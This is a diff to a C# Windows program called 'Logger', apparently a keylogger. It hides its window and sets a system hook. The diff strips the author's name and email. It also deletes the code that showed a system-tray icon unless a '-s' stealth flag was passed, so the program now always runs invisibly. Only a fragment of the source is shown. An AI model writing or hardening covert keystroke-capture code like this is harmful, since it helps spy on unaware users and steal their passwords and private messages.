@@ -1,11 +1,4 @@
-﻿/*
- * 
- * Felipe Bocolowski
- * felipebocolowski@outlook.com.br
- * 
- */
-
-using System;
+﻿using System;
 using System.Windows.Forms;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -27,26 +20,6 @@ namespace Logger
             ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
-
-            bool stealth = false;
-            
-            try
-            {
-                string stealthCheck = args[0];
-                if (stealthCheck == "-s")
-                {
-                    stealth = true;
-                }
-            }
-            catch
-            {
-                // DO NOTHING
-            }
-
-            if (stealth == false)
-            {
-                SystemTray tray = new SystemTray();
-            }
 
             Application.Run();
 
